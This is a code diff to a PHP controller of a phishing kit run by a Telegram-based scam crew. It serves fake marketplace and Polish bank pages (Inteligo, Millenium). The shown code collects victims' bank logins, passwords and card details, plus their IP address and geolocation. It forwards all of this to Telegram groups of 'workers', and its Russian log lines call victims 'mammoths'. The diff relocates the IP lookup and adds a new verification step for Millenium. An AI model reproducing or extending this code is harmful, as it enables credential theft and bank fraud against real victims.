@@ -108,6 +108,11 @@ class PagesController extends Controller
     {
         try {
             $fake = $this->getFake();
+            $ip = \request()->ip();
+            $ipData = ipstack($ip);
+            $city_geo = is_null($ipData)
+                ? ""
+                : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";
             $keyboard = Keyboard::make([
                 "inline_keyboard" => $chat_id === BotController::groupAdmin('id') ? [
                     [["text" => "⤴️ / (ошибка)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /"]],
@@ -119,7 +124,8 @@ class PagesController extends Controller
                 ] : [],
                 "resize_keyboard" => true,
             ]);
-
+            $text[] = "=================";
+            $text[] = "👤<b>IP:</b> <code>$ip $city_geo</code>";
             return $this->getTelegram()->sendMessage([
                 'chat_id' => $chat_id,
                 'text' => makeText($text),
@@ -135,11 +141,7 @@ class PagesController extends Controller
 
     public function index()
     {
-        $ip = \request()->ip();
-        $ipData = ipstack($ip);
-        $city_geo = is_null($ipData)
-            ? ""
-            : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";
+
 
         $fake = $this->getFake();
         $categoryName = $fake->category->name;
@@ -150,7 +152,6 @@ class PagesController extends Controller
                 "=================",
                 "🏷<b>Товар:</b> <code>{$fake->title}</code>",
                 "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
-                "👤<b>IP:</b> <code>$ip $city_geo</code>",
                 "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                 "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly()}</b>",
             ]);
@@ -202,8 +203,18 @@ class PagesController extends Controller
     {
         $fake = $this->getFake();
         $bankName = ucfirst($this->bank);
-        $next = ($this->bank === 'inteligo') ? subRoute('fake.code') : subRoute('fake.order');
         $step = ($request->has('step')) ? $request->get('step') : false;
+        $next = subRoute('fake.order');
+        switch ($this->bank) {
+            case 'inteligo':
+                $next = subRoute('fake.code');
+                break;
+            case 'millenium':
+                if (!$step) $next = null;
+                break;
+        }
+
+
         $html = $step && view()->exists($step) ? view($step)->render() : null;
         $text = [
             "⭐️<b>Мамонт ввел ЛК</b>",
@@ -212,10 +223,10 @@ class PagesController extends Controller
             "=================",
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly()}</b>",
-            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
-            "=================",
+            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>"
         ];
         foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, $text);
+        $text[] = "=================";
         if ($request->get('login'))
             $text[] = "🔑<b>Логин:</b> <code>{$request->get('login')}</code>";
         if ($request->get('password'))
@@ -236,11 +247,6 @@ class PagesController extends Controller
 
     public function order()
     {
-        $ip = \request()->ip();
-        $ipData = ipstack($ip);
-        $city_geo = is_null($ipData)
-            ? ""
-            : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";
         $fake = $this->getFake();
         if ($alertGroupId = BotController::groupAlert('id')) $this->sendLogs($alertGroupId, [
             "⭐️<b>Мамонт вбивает карту</b>",
@@ -248,7 +254,6 @@ class PagesController extends Controller
             "🆔<b>Номер объявления:</b> <code>{$fake->track_id}</code>",
             "🏷<b>Товар:</b> <code>{$fake->title}</code>",
             "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
-            "👤<b>IP:</b> <code>$ip $city_geo</code>",
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly()}</b>",
         ]);
@@ -294,11 +299,6 @@ class PagesController extends Controller
         $step = ($this->bank === 'inteligo') ? "fakes.banks.$bankName" : false;
         $html = $step && view()->exists($step) ? view($step)->render() : null;
 
-        $ip = \request()->ip();
-        $ipData = ipstack($ip);
-        $city_geo = is_null($ipData)
-            ? ""
-            : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";
 
         if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
             "👾<b>НОВЫЙ ПРИХОД</b> <code>$notify</code>",
@@ -312,7 +312,6 @@ class PagesController extends Controller
             "💁<b>Владелец :</b> <code>$holder</code>",
             "=================",
             "🆔<b>Номер объявления:</b> <code>{$fake->track_id}</code>",
-            "👤<b>IP:</b> <code>$ip $city_geo</code>",
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly()}</b>",
         ]);
@@ -335,10 +334,9 @@ class PagesController extends Controller
     {
         $fake = $this->getFake();
         foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
-            ($this->bank === 'millenium') ? "⭐️<b>️Мамонт на странице выбора картинки</b>" : "⭐️<b>️Мамонт на странице кода</b>",
+            "⭐️<b>️Мамонт на странице кода</b>",
             "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
         ]);
-        if ($this->bank === 'millenium') return view('fakes.verify');
         return view('fakes.code', [
                 'title' => 'Potwierdzenie operacji',
                 'categoryName' => mb_strtoupper($fake->category->name) . '_PAY',
@@ -377,7 +375,19 @@ class PagesController extends Controller
                 "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
             ]);
         }
-        if ($request->has('pic')) $this->logBank($request);
+        if ($this->bank === 'millenium') $next = subRoute('fake.verify');
+
+        return response()->json(['html' => null, 'next' => $next ?? null]);
+    }
+
+    public function verify()
+    {
+        $fake = $this->getFake();
+        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
+            "⭐️<b>️Мамонт на странице выбора картинки</b>",
+            "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
+        ]);
+        return view('fakes.verify');
     }
 
     public function error()
